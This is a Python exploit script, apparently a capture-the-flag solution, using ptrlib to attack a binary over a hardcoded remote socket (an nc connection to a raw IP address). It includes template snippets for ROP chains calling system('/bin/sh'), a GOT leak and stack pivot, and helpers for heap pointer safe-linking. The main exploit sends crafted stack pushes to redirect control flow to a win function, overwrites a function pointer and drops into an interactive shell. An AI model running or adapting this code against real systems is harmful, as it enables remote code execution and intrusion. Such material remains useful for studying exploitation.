# from pwn import cyclic_gen
from ptrlib import *
import argparse
import string

binary = "./a.out"
elf = ELF(binary)

r = None
"""
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
"""
# libc = ELF("./libc.so.6")
r = Socket("nc 34.170.146.252 55287")
# """


parser = argparse.ArgumentParser()
parser.add_argument(
    "--host",
    default="127.0.0.1",
    help="target host"
)
parser.add_argument(
    "--port",
    default=3001,
    help="target port"
)
parser.add_argument(
    '--log',
    action='store_true'
)
parser.add_argument(
    '--remote',
    nargs=2,
    metavar=('REMOTE_HOST', 'REMOTE_PORT'),
    help='remote host and port'
)
args = parser.parse_args()


log = args.log
is_remote = r is not None or args.remote is not None
if r is None:
    if is_remote:
        host = args.remote[0]
        port = args.remote[1]
        r = Socket(host, port)
    else:
        r = Process(binary)


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


def wait_for_attach():
    if not is_remote:
        input('attach?')


def sla(*args):
    r.sendlineafter(*args)


def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


def encrypt(val, addr):
    return val ^ (addr >> 12)


'''
snippets

## LIBC
environ = libc.symbol("environ")
logger.info("environ: " + hex(environ))

## ELF
elf.got("puts")
elf.plt("puts")

## ROP Gadgets
rop = [
    next(libc.gadget("ret")),
    next(libc.gadget("pop rdi; ret")),
    next(libc.find("/bin/sh")),
    libc.symbol("system")
]

payload += flat([
  # puts(puts@got)
  next(elf.gadget("pop rdi; ret;")),
  elf.got("puts"),
  elf.plt("puts"),
  # gets(stage2)
  next(elf.gadget("pop rdi; ret;")),
  addr_stage2,
  elf.plt("gets"),
  # stack pivot
  next(elf.gadget("pop rbp; ret;")),
  addr_stage2,
  next(elf.gadget("leave\n ret")) # GCC-style
], map=p64)

## ASM

print(assemble("""
  xor r12, r10
  movups [rsp], xmm0
  .word 12345
""", arch='amd64').hex()) # or bits=64/arch='intel' and so on

print(nasm("""
  call X
  db "Hello", 0
X:
  pop rax
""", bits=64).hex())

## Interaction
r.sendlineafter("> ", "1")
r.recvlineafter("> ")
r.sh()

## misc (pwntools)
g = cyclic_gen()
g = g.get(0x100)
(pos, chunk, idx) = g.find("baaa")
'''

def push(x):
    r.sendline("1")
    r.sendline(str(x))

T_addr = 0x4c8860
win_addr = 0x401427
N = 100016 - 1

cnt = N + 6
r.sendline(str(cnt))
for i in range(N):
    if i < 6:
        r.sendline("5")
    elif i == 6:
        push(win_addr)
    elif i == 7:
        r.sendline("2")
    else:
        # dummy
        r.sendline(win_addr)

wait_for_attach()

# [0x405040] _ZNSolsEPFRSoS_E@GLIBCXX_3.4 -> 0x4010b0 ◂— endbr64
victim = 0x405040
push(victim)
push(0)
push(victim)
push(0)
push(victim + 16)
push(0)

r.interactive()